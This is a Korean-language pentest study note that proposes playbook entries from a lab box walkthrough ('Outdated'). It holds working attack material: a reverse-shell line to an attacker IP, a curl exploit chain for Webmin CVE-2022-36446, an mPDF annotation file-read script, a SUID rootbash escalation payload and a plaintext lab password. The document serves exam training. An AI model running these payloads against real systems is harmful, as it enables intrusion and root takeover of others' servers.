---
tags:
  - type/audit
  - platform/pg
manual_tags: true
manual_cves: true
---
# Outdated — `_PLAYBOOK` 이관 제안

> [!warning] 이 파일은 제안이지 반영본이 아니다
> `_PLAYBOOK.md` 는 워커가 열지 않는다. 아래를 `pg-line-manager` 가 웨이브 종료 후 한 번에 append 한다.
> **신규 항목은 번호를 비워 두었다** — 번호 배정은 단독 기록자 몫이다.

출처 박스: [[Outdated]] (`192.168.248.232` · 2026-08-20 인스턴스 · 박스 정지됨)
산출물: `~/PG/Outdated/` (2026-08-20 15:24~15:45, 파일 25개 + `extract/` 빈 디렉터리)

---

## P1 — `A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다` · **병합**

**넣을 본문** (기존 절 말미에 append)

**Webmin 은 「302 인데 본문은 거부 경고」를 낸다 — 상태코드만 보면 영영 못 읽는다.** [[Outdated]]: CVE-2022-36446 첫 요청부터 다섯 번째까지 응답이 **계속 302** 였음. 그 사이 슬래시 잘림을 의심해 base64 로 감싸 보고, `confirm=1` 을 넣어 보고, `mode=new` 를 넣어 봤으나 **응답이 한 번도 변하지 않음.** 실수는 `-o` 로 파일에만 받아두고 상태코드만 본 것 — 그 파일을 열자 Webmin 이 답을 그대로 적어 두고 있었음:

```html
<title>Security Warning</title>
...
<b>Warning!</b> Webmin has detected that the program <tt>https://127.0.0.1:10000/package-updates/update.cgi?xnavigation&#61;1</tt> was linked to from an unknown URL, which appears to be outside the Webmin server.
...
Find the line <tt>referers_none=1</tt> and change it to <tt>referers_none=0</tt>.
```
— 출처: [[Outdated]] `~/PG/Outdated/exploit_resp.html`

`-e 'https://127.0.0.1:10000/package-updates/'` 로 `Referer` 를 붙이자 즉시 200 + `apt-get -y  install ;echo…` 출력(15:30:46 → 15:35:54, **약 5분**).

⚠️ **302 는 referer 체크가 만든 것이 아님.** Webmin 의 referer 거부 경로(`web-lib-funcs.pl` 의 `if (!$trust)`)는 경고 본문을 뱉고 `exit` 함. 302 가 섞여 나온 것은 요청 URL 에 `?xnavigation=1` 이 붙어 있어 그 앞의 테마 리다이렉트 분기(`REQUEST_URI =~ /xnavigation=1/` → `&redirect("/")`)가 함께 탄 결과임 — **상태코드는 302, 본문은 경고 페이지**라는 이상한 조합이 여기서 나옴.
→ **`curl -sk … | head -40` 을 기본 습관으로.** `-o` 로 받아만 두는 습관이 여기서 5분을 태움.

**지우기 전 원문** (Outdated.md 6장 3번)

> 3. **CVE 발화 조건 — 하나가 나머지를 전부 가리고 있었다.** 여기가 이 박스의 실체다(15:30:46 → 15:35:54, 약 5분).
>
>    첫 요청부터 마지막 직전까지 응답이 **계속 302** 였다. 그 사이 슬래시 잘림을 의심해 base64 로 감싸 보고, `confirm=1` 을 넣어 보고, `mode=new` 를 넣어 봤지만 응답은 **한 번도 변하지 않았다.** 조건을 바꾸는데 응답이 그대로면, 바꾸고 있는 조건이 아니라 **그 앞단이 막고 있는 것**이다.
>
>    실수는 응답 본문을 안 본 것이었다. `-o` 로 파일에 받아 두고 상태코드만 봤는데, 그 파일(`exploit_resp.html`)을 열자 Webmin 이 답을 그대로 적어 두고 있었다:
>
>    ```html
>    <title>Security Warning</title>
>    ...
>    <b>Warning!</b> Webmin has detected that the program
>    <tt>https://127.0.0.1:10000/package-updates/update.cgi?xnavigation=1</tt>
>    was linked to from an unknown URL, which appears to be outside the Webmin server.
>    ...
>    Find the line <tt>referers_none=1</tt> and change it to <tt>referers_none=0</tt>.
>    ```
>
>    `-e 'https://127.0.0.1:10000/package-updates/'` 로 `Referer` 를 붙이자 즉시 200 + `apt-get -y  install ;echo...` 출력.
>
>    덧붙여, 302 는 referer 체크가 만든 것이 **아니다.** Webmin 의 referer 거부 경로(`web-lib-funcs.pl` 의 `if (!$trust)`)는 경고 본문을 뱉고 그냥 `exit` 한다. 302 가 섞여 나온 건 요청 URL 에 `?xnavigation=1` 이 붙어 있었기 때문으로, 그 앞의 테마 리다이렉트 분기(`REQUEST_URI =~ /xnavigation=1/` → `&redirect("/")`)가 함께 탄 결과다. 그래서 **상태코드는 302, 본문은 경고 페이지**라는 이상한 응답이 나왔다. 상태코드만 보고 있었으면 영영 몰랐을 정보가 본문에 다 있었다.

(7장 5번도 같은 곳으로) > 5. **상태코드 말고 본문을 봐라.** `-o` 로 받아 두고 코드만 보는 습관이 여기선 몇 분을 태웠다. Webmin 은 거부 사유와 해결법(`referers_none`)을 본문에 다 적어 준다. `curl -sk ... | head -40` 을 기본으로.

---

## P2 — `A-31. 리버스셸이 안 붙는다` · **병합**

**넣을 본문** (기존 절 말미에 append)

**「콜백이 없다」와 「명령이 안 돈다」는 완전히 다른 문제인데 증상이 똑같다.** [[Outdated]] — 인증 후 RCE(CVE-2022-36446) 발화 조건을 다 맞춘 뒤 첫 페이로드가 `bash -i >& /dev/tcp/192.168.45.207/443 0>&1` 리버스셸이었음. 응답은 200 이고 apt 출력에 주입 명령이 그대로 찍혔는데도 nc 리스너에 아무것도 안 옴. tcpdump 로도 connect-back 이 안 보여 **아웃바운드 필터로 판단**(그 tcpdump 출력은 파일로 안 남김 — 판정 근거는 `resp2.html` 의 명령 반향과 빈 리스너까지임 `[가정]`).

```html
<tt>apt-get -y  install ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDMgMD4mMQ==|base64 -d|bash;</tt>
```
— 출처: [[Outdated]] `~/PG/Outdated/resp2.html`

→ **둘을 분리하는 가장 싼 방법은 네트워크를 안 쓰는 마커를 «먼저» 쏘는 것**(`id > /tmp/x` 를 base64 로 감싼 것). 이 박스는 순서가 반대였음 — 발화 조건 문제를 먼저 풀고 나서야 네트워크 문제가 드러남.
→ **리버스셸에 매달리지 않고 이미 쥔 SSH 세션 + SUID 드롭으로 우회**함. 결과적으로 웹셸 플래그 0점 규정도 함께 피한 경로임(E 절).

**지우기 전 원문** (Outdated.md 6장 4번 + 교훈 일반화)

> 4. **리버스셸 무응답** — 조건을 다 맞춘 뒤 첫 페이로드는 `bash -i >& /dev/tcp/192.168.45.207/443 0>&1` 리버스셸이었다. 응답(`resp2.html`)은 200 이었고 apt 출력에 내 명령이 그대로 찍혀 있는데도 nc 리스너엔 아무것도 안 왔다. tcpdump 로도 connect-back 이 안 보여 아웃바운드 필터로 판단했다. 리버스셸에 매달리지 않고 **이미 있는 SSH + SUID 드롭**으로 우회했다. 이게 오히려 OSCP 규정상 안전한 경로(웹셸 회피)였다.
>
> **교훈 일반화**: 인증 후 RCE 에서 "콜백이 없다"와 "명령이 안 돈다"는 완전히 다른 문제인데 증상이 똑같다. 둘을 분리하는 가장 싼 방법은 **네트워크를 안 쓰는 마커**(`id > /tmp/x` 를 base64 로 감싼 것)를 먼저 쏘는 것이다. 이 박스는 순서가 반대였다 — 발화 조건 문제(3번)를 풀고 나서야 네트워크 문제(4번)가 드러났다.

(7장 7번도 같은 곳으로) > 7. **리버스셸이 안 붙으면 즉시 대안으로.** 아웃바운드 필터는 흔하다. 이미 자격증명이 있으면 SSH + SUID 드롭이 더 확실하고, 웹셸 플래그 0점 규정도 피한다.

---

## P3 — `A-41. 셸은 잡았는데 권한상승 실마리가 없다` · **병합**

**넣을 본문** (기존 절 말미에 append)

**SUID·caps·cron 이 전부 배포판 표준이면 답은 `ss -lntp` 의 내부 리슨 포트에 있다.** [[Outdated]] — SUID 17개가 Ubuntu 20.04 표준 목록 그대로, capabilities 5개도 전부 네트워크용(`cap_net_raw`·`cap_net_bind_service`), `/etc/cron.d` 도 배포판 기본(`e2scrub_all`·`php`·`popularity-contest`), `sudo` 는 비번을 넣어도 `Sorry, user svc-account may not run sudo on outdated.`

남은 단서는 `ss` 한 줄이었음:

```text
LISTEN  0        4096             0.0.0.0:10000          0.0.0.0:*              
```
— 출처: [[Outdated]] `~/PG/Outdated/enum_user.txt`

nmap 이 `10000/tcp filtered` 로 본 포트였고, 바인딩은 **`0.0.0.0`** 이라 로컬 전용 서비스가 아니었음 — 밖에서 안 보인 것은 **경로상 방화벽**이 삼킨 결과. 여기서 SSH `-L` 로 끌어와 Webmin 1.996(CVE-2022-36446)으로 root 를 잡음.
→ **저권한 열거가 전부 「표준」으로 나오면 그것은 빈손이 아니라 「네트워크 쪽을 보라」는 신호임.** C-2 의 `ss -lntp` 를 빠뜨리면 이 박스는 통째로 막힘.

**지우기 전 원문** (Outdated.md 4장 「열거로 무엇을 봤는가」 산문 부분 — 열거 원문 자체는 노트에 존치)

> SUID 는 Ubuntu 20.04 표준 목록 그대로, capabilities 다섯 개도 전부 네트워크용(`cap_net_raw`/`cap_net_bind_service`)이라 쓸 게 없다. cron 도 `/etc/cron.d` 에 배포판 기본 파일(`e2scrub_all`·`php`·`popularity-contest`)뿐이었다.
>
> 남는 건 `ss` 의 세 번째 줄이다. **`0.0.0.0:10000`** — Webmin 은 로컬 전용으로 묶여 있는 게 아니라 **모든 인터페이스에 떠 있다.**

---

## P4 — `A-63. 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다` · **병합**

**넣을 본문** (기존 절 말미에 append)

**「성공한 쪽」의 응답만 골라 안 남기는 사고가 반복된다.** [[Outdated]] — CVE-2022-36446 요청 중 **실패한 것**(`exploit_resp.html`, Referer 없음 → 거부)과 **중간 시도**(`resp2.html`, 리버스셸 페이로드 → 명령은 돌았으나 콜백 없음)는 남았는데, **실제로 root 를 만든 rootbash 드롭 요청의 응답은 저장되지 않음.** 그래서 노트가 「명령이 root 로 실행됐다」의 근거로 **한 단계 앞선 요청의 응답**을 인용해야 했음.
→ 원인은 A-63 본문과 같음 — **「통했다」 직후 다음 단계로 바로 넘어감.** 실패 응답을 남기는 습관은 이미 있었으나 성공 응답에는 적용되지 않았음.
→ 보험: `-o resp_<단계>.html` 처럼 **파일명에 단계를 박아** 매 요청을 다른 파일로 받을 것. 같은 이름에 덮어쓰면 성공본이 실패본을 지우거나 그 반대가 됨.

**지우기 전 원문** (Outdated.md 4장 산문)

> 응답 본문이 스스로 실행을 증언한다. 아래는 **먼저 시도했던 리버스셸 페이로드**의 응답(`resp2.html`)에서 뜯은 것 — rootbash 요청의 응답은 저장하지 않았으므로 실측으로 남은 건 이쪽이다

(노트에는 같은 유보를 유지하고 A-63 앵커만 걸었다 — 이관이 아니라 **일반화만** 옮긴 항목이다.)

---

## P5 — `A-1. 정찰·열거` · **신규** (번호 미정)

**제목 후보:** `nmap 이 filtered 라고 적은 포트를 버렸다`

**넣을 본문**

**`filtered` 는 「안 열림」이 아니다 — 같은 스캔의 나머지 포트가 뭐라고 적혀 있는지 함께 읽을 것.**

[[Outdated]] — top-1000 과 `-p-` 두 스캔 모두 동일:

```text
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http             Apache httpd 2.4.41 ((Ubuntu))
10000/tcp filtered snet-sensor-mgmt
```
— 출처: [[Outdated]] `~/PG/Outdated/nmap.log` · `quick.log`

닫힌 포트 65532개는 **RST 로 답하는데** 10000 만 무응답임 → **응답을 삼키는 무언가가 경로에 있다**는 뜻이지 서비스가 없다는 뜻이 아님. 침투 후 `ss -lntp` 로 확인하니 바인딩이 **`0.0.0.0:10000`** 이었음 — 로컬 전용이라 안 보였던 것이 아니라 **경로상 방화벽**이 원인.

- **정찰 단계에서 할 일** — filtered 포트의 기본 서비스를 메모해 둘 것(10000 = Webmin, 3306 = MySQL 등). 침투 후 제일 먼저 확인할 목록이 됨
- **셸을 잡으면** `ss -lntp` 로 대조하고 SSH `-L` 로 끌어올 것(B-7)
- ⚠️ 반대 방향 오독 주의 — filtered 가 **항상** 무언가 있다는 뜻도 아님. 「열려 있다는 근거가 없음」과 「닫힘이 확인됨」의 구분은 A-19 와 같은 선임

---

## P6 — `A-2. 진입 (foothold)` · **신규** (번호 미정)

**제목 후보:** `파일 읽기는 통했는데 «출력이 안 보인다»`

**넣을 본문**

**변환기·렌더러 계열 LFI 는 결과를 화면에 안 뿌리고 «산출물 안»에 넣는다.** 「출력에 안 나온다 = 실패」로 넘기면 통째로 놓침.

[[Outdated]] — mPDF 6.0 의 `<annotation file="/etc/passwd" …/>` 를 보내니 PDF 는 정상 반환되는데 화면에 `/etc/passwd` 내용이 없었음. mPDF 는 파일을 **본문에 렌더하지 않고 PDF 첨부(EmbeddedFile)로 삽입**함.

- 확인: `strings out.pdf | grep EmbeddedFile` 로 첨부 객체 존재부터
- 스트림이 `/FlateDecode` 라 **zlib 해제**가 필요(`~/PG/Outdated/extract_attach.py`, 20줄). Kali 에 `pdfdetach` 가 없어 직접 작성함
- 일반화: **컨테이너 포맷(PDF·docx·zip·이미지 메타)으로 답이 돌아오면 「파싱해서 꺼내는 단계」가 하나 더 있다**고 볼 것

**⛔ 그리고 「첨부가 아예 안 생기는 것」이 곧 권한 부족 신호다.** 같은 박스에서 `/home/svc-account/.ssh/id_rsa`·`/root/.ssh/id_rsa`·`/etc/shadow` 는 전부 `[!] no EmbeddedFile object` 로 돌아왔음 — 웹서버 프로세스 권한 밖이라 mPDF 가 못 읽은 것. **에러 메시지가 아니라 「객체 부재」로 나타나므로** 도구가 실패를 명시적으로 알려주지 않음. 여기서 방향을 권한 되는 파일(`/etc/passwd`·웹루트 소스)로 틀어 `config.php` 를 찾은 것이 진입점이 됨.

**지우기 전 원문** (Outdated.md 6장 1·2번)

> 1. **LFI 출력이 안 보임** — 처음 `<annotation>` 을 보내니 PDF 는 나오는데 `/etc/passwd` 내용이 화면에 없었다. mPDF 는 파일을 **본문에 렌더하지 않고 첨부**한다. `strings out.pdf | grep EmbeddedFile` 로 첨부 객체를 확인하고, 스트림이 `/FlateDecode` 라 직접 zlib 로 풀어야 했다. "출력에 안 나온다 = 실패"로 넘겼으면 놓쳤을 것.
>
> 2. **SSH 키·shadow 읽기 실패** — `/home/svc-account/.ssh/id_rsa`, `/root/.ssh/id_rsa`, `/etc/shadow` 전부 `[!] no EmbeddedFile object` 로 돌아왔다. www-data 권한 밖이라 mPDF 가 못 읽은 것. 권한 되는 파일(`/etc/passwd`, 웹루트 소스)로 방향을 틀어 config.php 를 찾았다.

---

## P7 — `A-6. 판단·검증 (메타)` · **신규** (번호 미정)

**제목 후보:** `조건을 바꾸는데 응답이 한 글자도 안 변한다`

**넣을 본문**

**조건 A·B·C 를 바꿔가며 던지는데 응답이 그대로면, 바꾸고 있는 조건이 아니라 «그 앞단»이 막고 있는 것이다.** 요청이 그 조건을 판정하는 코드까지 도달조차 못 하고 있다는 뜻임.

[[Outdated]] 실측 — CVE-2022-36446 에서 슬래시 잘림 회피(base64) · `confirm=1` · `mode=new` 를 차례로 넣었으나 응답이 **다섯 번 연속 동일**했음. 셋 다 실제로 필요한 조건이었는데도 그랬음 — 진짜 벽은 그 앞의 `Referer` 검사였기 때문(A-15).

**인증 후 RCE 의 앞단 후보** — Referer/CSRF 체크 · 세션 만료 · 모듈 ACL · 리버스프록시.
**진단 순서** — ① 응답 «본문»부터 열 것(상태코드가 아니라) ② 의도적으로 **틀린 값**을 보내 응답이 달라지는지 볼 것. 틀린 값에도 응답이 같으면 그 파라미터는 아직 읽히지도 않는 것임.

**지우기 전 원문** (Outdated.md 0장·7장 4번)

> - Webmin 1.996 = **CVE-2022-36446**. 조건을 하나씩 바꿔도 응답이 안 변하면, 바꾸고 있는 조건이 아니라 **그 앞단이 막고 있는 것**이다. 여기선 `Referer` 였다.
>
> 4. **응답이 안 변하면 앞단을 의심하라.** 조건 A·B·C 를 바꿔가며 던지는데 응답이 한 글자도 안 변하면, 요청이 그 조건을 판정하는 코드까지 도달조차 못 하고 있는 것이다. 인증 후 RCE 의 앞단 후보: Referer/CSRF 체크, 세션 만료, ACL, 리버스프록시.

---

## P8 — `B-1. 웹` · **신규** (번호 미정)

**제목 후보:** `문서 변환기(HTML→PDF)는 서버측 파서다 — mPDF `<annotation>` 임의 파일 읽기`

**넣을 본문**

**탐지 신호** — 입력창에 HTML/마크다운을 넣으면 PDF·이미지·docx 가 돌아오는 화면. 「Convert HTML to PDF」 류.

**먼저 볼 것은 그 파서의 확장 태그다.** 표준 HTML 만 처리한다고 가정하지 말 것.

| 엔진 | 노려볼 것 |
|---|---|
| mPDF | `<annotation file="">`(파일을 PDF 첨부로 삽입) · `<barcode>` · `<qr>` |
| wkhtmltopdf · headless Chrome | `<iframe src="file://…">` · `<img src="file://…">` · SSRF |
| LaTeX 계열 | `\input{}` · `\write18` |

**버전 판정 독립 근거 2개**(응답 헤더 + 산출물 메타데이터) — [[Outdated]] 실측:

```text
Content-disposition: inline; filename="mpdf.pdf"
```
```bash
python3 -c "d=open('out1.pdf','rb').read(); i=d.find(b'/Producer'); \
  print(d[i+11:d.find(b')',i+11)].decode('utf-16-be'))"
```
⚠️ **mPDF 는 `/Producer` 를 UTF-16BE 로 쓴다 — `strings` 로는 안 보인다.** 바이트를 직접 디코드할 것. 세 번째 근거로 `/vendor/composer/installed.json` 도 있음.

**mPDF `<annotation>` 수동 재현**(자동 도구 없음):

```bash
#!/bin/bash
# usage: ./lfi.sh /etc/passwd
F="$1"
curl -s -m 30 -X POST --data-urlencode "html=<annotation file=\"$F\" content=\"$F\" icon=\"Graph\" title=\"a\" pos-x=\"195\" />" http://<타겟>/index.php -o /tmp/lfi.pdf
python3 extract_attach.py /tmp/lfi.pdf
```
— 출처: [[Outdated]] `~/PG/Outdated/lfi.sh`

- `--data-urlencode` 를 기본으로 둘 것 — 페이로드에 `&`·`+`·`%` 가 섞이면 `-d` 는 거기서 파라미터를 자르거나 값을 바꿈. ⚠️ **`<`·`>`·`"`·`/`·공백은 폼 인코딩에서 특수문자가 «아니고», 이 페이로드는 `-d` 로도 같은 값이 도달함**(2026-08-26 Kali 로컬 PHP 로 양쪽 대조). 「이 문자들 때문에 `-d` 로는 깨진다」는 서술은 반증됨
- `content` **필수** — mPDF `v6.0.0` `mpdf.php` 의 `case 'ANNOTATION'` 이 `isset($attr['CONTENT'])` 아니면 즉시 `break` → 태그가 통째로 버려지고 첨부도 안 생김. `icon`·`title`·`pos-x` 는 선택이고 기본값이 각각 `Note`·빈 문자열·`0`. 하나씩 빼는 실험은 박스에서 하지 않았음(관측 없음)
- `php://filter/convert.base64-encode/resource=<경로>` 래퍼도 통함
- 결과는 화면이 아니라 **PDF EmbeddedFile 스트림**(`/FlateDecode`)에 들어감 — 꺼내는 절차는 A 절(파일 읽기는 통했는데 출력이 안 보인다)

**노림수** — 웹루트의 설정 파일. [[Outdated]] 는 `/config/config.php` 의 **주석 처리된 mysqli 블록**에 있던 비번이 OS 계정 SSH 비번과 같았음. **주석은 은닉이 아님** — 브라우저로 열면 빈 화면이라 LFI 로만 보임.

**출처** — [[Outdated]].

---

## P9 — `B-1. 웹` · **신규** (번호 미정)

**제목 후보:** `Webmin package-updates 인증 후 RCE — CVE-2022-36446`

**넣을 본문**

**탐지 신호** — tcp/10000 (또는 20000 = Usermin). `MiniServ` 배너, 자체서명 인증서, **https 필수**(평문 http 로 붙으면 정상 응답이 안 옴). 버전은 `/usr/share/webmin/version` 또는 모듈 페이지 `<title>` 에 그대로 박혀 있음.

**핵심 — 인증이 unix/PAM 이라 OS 계정 자격증명이 그대로 통한다.** 별도 Webmin 계정을 찾을 필요가 없음. 그리고 MiniServ 가 root 로 돌므로 주입 명령도 root 로 실행됨.

```bash
# ① 로그인 — 쿠키 항아리에 sid 가 떨어지면 성공
curl -sk -c cj.txt -H 'Cookie: testing=1' \
  https://127.0.0.1:10000/session_login.cgi \
  --data 'user=<계정>&pass=<퍼센트인코딩한 비번>'

# ② 모듈 접근권 확인 — 200 + 모듈 «본문»이 오면 ACL 있음
curl -sk -b cj.txt https://127.0.0.1:10000/package-updates/ -o pu.html

# ③ 주입
curl -sk -b "sid=<SID>" -e 'https://127.0.0.1:10000/package-updates/' \
  'https://127.0.0.1:10000/package-updates/update.cgi' \
  --data-urlencode "u=;echo <BASE64>|base64 -d|bash;" \
  --data-urlencode 'confirm=1' --data-urlencode 'mode=new'
```

**발화 조건 셋 — 하나라도 빠지면 조용히 아무 일도 안 난다:**

| 조건 | 왜 |
|---|---|
| **`Referer` 헤더**(`-e`) | 없으면 Security Warning + 302. **이것이 나머지 둘을 전부 가림**(A-15) |
| **`mode=new`** | `&package_install($p,$s,$in{'mode'} eq 'new')` — 거짓이면 존재하지 않는 이름에서 `!$pkg` 로 return, 싱크에 도달 못 함 |
| **페이로드에 `/` 금지** | `($p,$s) = split(/\//,$ps)` 로 앞 조각만 씀. **명령 전체를 base64 로 감쌀 것**(B-81) |

`confirm=1` 은 **필수 여부 미확정** — 당시 기록은 「없으면 dry-run 만」이라 적었으나 소스상으로는 빈 결과 → 설치 분기로 떨어짐. 따로 떼어 검증한 적 없음 `[가정]`. 붙여 보낼 것.

**메커니즘** — `software/apt-lib.pl` 의 `update_system_install`:
```perl
$update = join(" ", map { quotemeta($_) } split(/\s+/, $update));
$update =~ s/\\(-)|\\(.)/$1$2/g;                                    # ← quotemeta 를 도로 벗긴다
local $cmd = "$apt_get_command -y ".($force ? " -f" : "")." install $update";
```
`quotemeta` 로 이스케이프한 직후 정규식이 백슬래시를 전부 벗김 → `;`·`|` 가 그대로 셸에 도달.

**⚠️ 접근권 판정 함정** — 응답 루트 태그의 `data-access-level="0"` 과 `data-package-updates="1"` 을 근거로 쓰지 말 것. **거부당한 응답(`exploit_resp.html`)에도 똑같이 붙어 있음**(2026-08-26 재확인). 판정 근거는 「모듈 본문이 왔는가」 하나임.

**시험 관점** — Metasploit 에 `webmin_package_updates_rce` 모듈이 있으나 **1대 한정 카드**라 수동이 이득(E 절).

**출처** — [[Outdated]] (Webmin 1.996 / Ubuntu 20.04.5).

---

## P10 — `B-7. 피벗·터널링` · **신규** (현재 「아직 항목 없음」 — 첫 항목)

**제목 후보:** `내부에만 열린 서비스는 SSH `-L` 로 끌어온다`

**넣을 본문**

**셸을 잡은 뒤 `ss -lntp` 에 보이는데 nmap 에는 안 보이는 포트 = 즉시 로컬 포워딩 대상.**

```bash
ssh -L 127.0.0.1:10000:127.0.0.1:10000 <계정>@<타겟>
```
`-L <로컬바인드>:<원격이 보는 주소>:<원격포트>` — Kali 의 `127.0.0.1:10000` 으로 온 것을 SSH 세션 반대편이 자기 `127.0.0.1:10000` 으로 내보냄. 이후 모든 요청은 Kali 에서 `https://127.0.0.1:10000/` 로 침.

- **바인딩 주소를 먼저 읽을 것** — `0.0.0.0` 이면 방화벽이 원인이고, `127.0.0.1` 이면 서비스가 로컬 전용인 것. [[Outdated]] 는 `0.0.0.0:10000` 이었음(경로상 방화벽)
- **스킴을 확인할 것** — Webmin MiniServ 는 SSL 모드라 `https` + `-k`(자체서명) 필수. 평문 http 로 붙으면 정상 응답이 안 옴
- **로컬 포트를 원격과 같게 맞추는 편이 낫다** — 앱이 절대 URL(`Referer`·리다이렉트)에 자기 포트를 박아 넣는 경우가 있음. Webmin 이 그 사례임
- 반대 방향(내 서비스를 타겟에 노출)은 `-R`, 동적 SOCKS 는 `-D` + `proxychains`

**출처** — [[Outdated]] (tcp/10000 Webmin).

---

## P11 — `B-81. 페이로드는 base64로 감싼다` · **병합**

**넣을 본문** (기존 한 줄 아래 append)

**인용 계층만이 아니라 «문자 제약» 우회에도 쓴다.** [[Outdated]] — Webmin `update.cgi` 가 패키지 이름을 `split(/\//,$ps)` 로 잘라 **`/` 가 든 명령은 첫 슬래시에서 죽음.** 명령 전체를 base64 로 감싸 슬래시를 없앰:

```bash
echo -n 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' | base64 -w0
```
```text
Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NzcgL3RtcC9yb290YmFzaA==
```
전달 형태: `u=;echo <B64>|base64 -d|bash;`

⚠️ **base64 알파벳에는 `/` 가 들어갈 수 있다.** 감쌌다고 안심하지 말고 **출력을 눈으로 확인**할 것. 걸리면 hex 로 바꿀 것 — `echo <hex> | xxd -r -p | bash`, hex 알파벳은 `0-9a-f` 뿐이라 안전함.

---

## P12 — `C-1. 정찰 직후` · **병합**

**넣을 본문** (기존 절 말미에 append)

**`filtered` 포트를 표로 적어 둘 것.** 침투 후 `ss -lntp` 와 대조할 목록이 됨. [[Outdated]] 는 `10000/tcp filtered` 하나가 권한상승 경로 전체였음(A-1 신규 항목 · B-7).

---

## P13 — `D. 시간 배분 · 손절 기준` · **병합**

**넣을 본문** (실측 목록에 한 항목 추가)

실측([[Outdated]]) — 전체 **12분**(첫 스캔 15:24:28 → `proof_root.txt` 15:36:56). **user 플래그까지 4분**(15:28:36). 유일하게 태운 곳은 **CVE 발화 조건 5분**(15:30:46 → 15:35:54)이고 원인은 응답 «본문»을 안 읽은 것(A-15). **발화 조건을 추측 대신 소스로 읽은 것이 빨랐음** — 조건 셋(Referer·`mode=new`·슬래시 잘림)을 조합 탐색으로 풀었으면 시간이 몇 배가 됐을 것.

산출물 mtime 으로 재구성한 시간표(KST. 타겟 로그는 UTC 라 9시간 차 — `06:28 UTC` = `15:28 KST`):

| 시각 | 산출물 | 무슨 일 |
|---|---|---|
| 15:24:40 | `quick.log` | top-1000 스캔 |
| 15:24:45 | `nmap.log` | 전 포트 스캔 |
| 15:24:57 | `hdr1.txt` · `out1.pdf` | mPDF 6.0 지문 확보 |
| 15:25:32 | `try1_annotation_passwd.pdf` | LFI 첫 성공 |
| 15:27:49 | `gobuster.log` | `/config`·`/vendor` |
| 15:28:17 | `config.php.txt` | 자격증명 |
| **15:28:36** | `proof_user.txt` | **user 플래그 — 시작 4분** |
| 15:29:04 | `enum_user.txt` | 열거 일괄 |
| 15:29:55 | `cj.txt` | Webmin 로그인 |
| 15:30:21 | `pu.html` | package-updates 접근 확인 |
| 15:30:46 | `exploit_resp.html` | **첫 익스플로잇 — Referer 차단** |
| 15:35:54 | `resp2.html` | 명령 실행 성공(리버스셸 페이로드) |
| **15:36:56** | `proof_root.txt` | **root — 전체 12분** |

⚠️ 실패 로그는 `try1`·`try4` 만 남음. 그 사이 `try2`·`try3` 는 보존되지 않았음. `notes_init.sh`(0바이트)와 `extract/`(빈 디렉터리)도 그대로 보존 — 「빈 결과를 받았다」는 기록임.

**표(박스별 소요 시간과 손절점)에 추가할 행:**

| [[Outdated]] | 전체 **12분** (user 4분) | 발화 조건 5분이 유일한 손실. 응답 본문을 안 읽은 것이 원인(A-15) |

---

## P14 — `E. OSCP 시험 규정` · **병합**

**넣을 본문** (「Metasploit 대안이 있어도 일부러 안 쓰는 판단」 목록에 append)

- [[Outdated]] 는 `exploit/unix/webapp/webmin_package_updates_rce` 가 있었으나 **1대 한정 카드를 여기 쓰지 않고** curl 세 파라미터(`u`·`confirm`·`mode`) + `-e`(Referer)로 수동 진행. LFI 도 `curl --data-urlencode` + 파이썬 20줄이라 전 구간 자동 도구 없음
- **웹셸 회피가 결과적으로 함께 해결된 사례임** — 리버스셸이 안 붙어 인증 후 RCE 를 「단발 명령 실행」으로만 쓸 수 있었는데, 그것으로 **SUID bash 를 떨구고 기존 SSH 세션에서 `bash -p`** 로 승격함. 단발 RCE 로 플래그를 읽었으면 0점이었음
- ⚠️ **`euid=0` 과 「root 셸」을 구분해 적을 것.** `proof_root.txt` 는 `uid=1000(svc-account) … euid=0(root)` 임. `whoami` 가 `root` 로 나오는 것은 whoami 가 euid 를 보기 때문이고, 실 uid 는 그대로임

---

## P15 — `F-2. 읽는 법` · **병합**

**넣을 본문** (기존 목록에 한 줄 추가)

- **`filtered` 로 적힌 포트를 목록에서 지우지 말 것.** 같은 스캔이 나머지를 `closed (reset)` 이라 적고 있다면 filtered 는 **응답이 삼켜진 것**임. [[Outdated]] 의 `10000/tcp filtered` 는 내부에서 `0.0.0.0:10000` 으로 열려 있던 Webmin 이었고, 그것이 권한상승 경로 전체였음

---

# 노트에서 제거한 것 (이관 아님 — 원문 보존용)

## D1 — 창작된 PHP 코드 블록 (Outdated.md 2장)

산출물에 대응 파일 없음. `[가정]` 이 붙어 있었으나 **코드펜스는 실측의 표식**(CLAUDE.md §3)이라 펜스를 걷고 산문만 남겼음. 정보 내용(사용자 입력이 필터 없이 `WriteHTML()` 계열로 들어감)은 노트에 그대로 보존.

> `[가정]` `index.php` 는 LFI 로 읽었으나 그 출력을 산출물로 저장하지 않았다. 기억으로 재구성한 골자는 아래와 같고, **이 코드 블록만 실측 증거가 없다**:
>
> ```php
> <?php
> if (isset($_POST['html'])) {
>     require_once __DIR__ . '/vendor/autoload.php';
>     $mpdf = new \mPDF();
>     $html = $_POST['html'];
>     $mpdf->WriteHTML($html);   // ← 사용자 HTML 을 그대로 mPDF 에 넘김
>     $mpdf->Output();
> }
> ```

## D2 — 타겟 pty 프롬프트 한 줄 (Outdated.md 3장)

`~/PG/Outdated/` 어느 파일에도 이 프롬프트 문자열이 없음. `id` 출력 자체는 `enum_user.txt`·`proof_user.txt` 와 일치하므로 값은 보존하고 프롬프트만 제거.

> ```bash
> $ sshpass -p 'best&_#Password@2021!!!' ssh svc-account@192.168.248.232
> svc-account@outdated:~$ id
> uid=1000(svc-account) gid=1000(svc-account) groups=1000(svc-account)
> ```

⚠️ **다만 pty 자체는 실측으로 확인됨** — `proof_*.txt` 말미의 `Connection to 192.168.248.232 closed.` 는 pty 를 할당한 ssh 클라이언트만 출력하는 줄임(2026-08-26 Kali 실측: `ssh -tt host "cmd"` 는 출력, `ssh host "cmd"` 는 미출력). 그러므로 「프롬프트 캡처 없음」이지 「비대화형이었음」이 아님.

## D3 — 손으로 축약된 nmap 블록 (Outdated.md 1장)

